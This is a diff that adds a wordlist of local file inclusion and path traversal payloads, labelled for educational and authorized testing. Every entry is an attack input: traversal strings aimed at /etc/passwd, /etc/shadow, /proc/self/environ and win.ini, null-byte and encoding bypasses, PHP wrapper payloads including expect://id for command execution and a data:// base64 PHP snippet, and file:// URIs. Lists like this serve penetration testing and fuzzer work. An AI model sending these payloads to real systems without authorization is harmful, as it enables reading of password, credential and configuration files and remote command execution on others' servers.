@@ -1,0 +1,75 @@
+# Local File Inclusion / Path Traversal Payloads
+# For educational and authorized testing only
+
+# ============================================================================
+# BASIC TRAVERSAL (LINUX)
+# ============================================================================
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/hostname
+../../../proc/self/environ
+../../../proc/version
+
+# ============================================================================
+# BASIC TRAVERSAL (WINDOWS)
+# ============================================================================
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\..\Windows\System32\drivers\etc\hosts
+..\..\..\..\boot.ini
+
+# ============================================================================
+# NULL BYTE BYPASS
+# ============================================================================
+../../../etc/passwd%00
+../../../etc/passwd%00.html
+../../../etc/passwd%00.jpg
+
+# ============================================================================
+# DOUBLE ENCODING
+# ============================================================================
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+
+# ============================================================================
+# DOTS AND SLASHES BYPASS
+# ============================================================================
+....//....//....//etc/passwd
+..../....//....//etc/passwd
+....\/....\/....\/etc/passwd
+
+# ============================================================================
+# ABSOLUTE PATHS
+# ============================================================================
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+C:\Windows\win.ini
+C:/Windows/win.ini
+
+# ============================================================================
+# PHP WRAPPERS
+# ============================================================================
+php://filter/read=convert.base64-encode/resource=index
+php://filter/read=convert.base64-encode/resource=../config
+php://filter/read=convert.base64-encode/resource=../../config
+php://input
+expect://id
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+
+# ============================================================================
+# FILE SCHEME
+# ============================================================================
+file:///etc/passwd
+file:///etc/hosts
+file:///c:/windows/win.ini
